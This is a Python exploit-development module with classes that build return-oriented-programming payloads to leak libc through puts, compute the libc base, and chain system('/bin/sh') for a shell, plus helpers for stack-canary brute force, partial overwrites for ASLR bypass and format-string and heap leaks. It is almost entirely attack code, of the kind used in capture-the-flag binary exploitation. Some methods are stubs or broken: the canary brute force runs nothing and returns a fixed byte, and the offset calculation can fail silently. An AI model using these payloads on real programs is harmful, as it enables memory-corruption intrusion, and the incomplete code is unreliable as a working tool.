import struct
import subprocess
from payload import ROPGen, Shellcode, Payload

class Exploit:
    def __init__(self, target, libc_path=None):
        self.target = target
        self.rop = ROPGen(target)
        self.libc_base = 0
        self.leaked = {}
        
    def leak_libc(self, got_puts, plt_puts):
        # stage 1: leak libc
        p = Payload()
        p.pad(40)  # offset to RIP
        
        # pop rdi; ret
        pop_rdi = self.rop.find("pop rdi")
        if pop_rdi:
            p.qword(pop_rdi)
            p.qword(got_puts)
            p.qword(plt_puts)
            p.qword(self.rop.find("ret"))
            
        return p.chain
        
    def calc_offsets(self, leaked_puts, libc_path):
        # get libc base from leaked puts
        try:
            out = subprocess.check_output(["readelf", "-s", libc_path], 
                                        stderr=subprocess.STDOUT, text=True)
            for line in out.split("\n"):
                if " puts@" in line:
                    puts_offset = int(line.split()[1], 16)
                    break
                    
            self.libc_base = leaked_puts - puts_offset
            return self.libc_base
        except:
            return 0
            
    def get_shell(self, system_offset, binsh_offset):
        system = self.libc_base + system_offset
        binsh = self.libc_base + binsh_offset
        
        p = Payload()
        p.pad(40)
        
        pop_rdi = self.rop.find("pop rdi")
        if pop_rdi:
            p.qword(pop_rdi)
            p.qword(binsh)
            p.qword(system)
            
        return p.chain

class ASLRBypass:
    def __init__(self, target):
        self.target = target
        
    def brute_canary(self, prefix=b"", max_len=200):
        # simple canary brute force
        canary = b"\x00"
        for i in range(1, 8):
            for b in range(256):
                test = prefix + b"A" * 40 + canary + bytes([b])
                # run target with test
                # check if crash
                pass
        return canary
        
    def partial_overwrite(self, target_addr, known_bits=32):
        # partial overwrite for ASLR bypass
        mask = (1 << known_bits) - 1
        partial = target_addr & mask
        return struct.pack("<I", partial)

class InfoLeak:
    def __init__(self, target):
        self.target = target
        
    def format_string(self, fmt_str="%p.%p.%p.%p"):
        # basic format string leak
        p = Payload()
        p.add(fmt_str.encode())
        return p.chain
        
    def heap_leak(self, size=0x100):
        # heap metadata leak
        p = Payload()
        p.qword(0x4141414141414141)
        p.qword(size)
        return p.chain
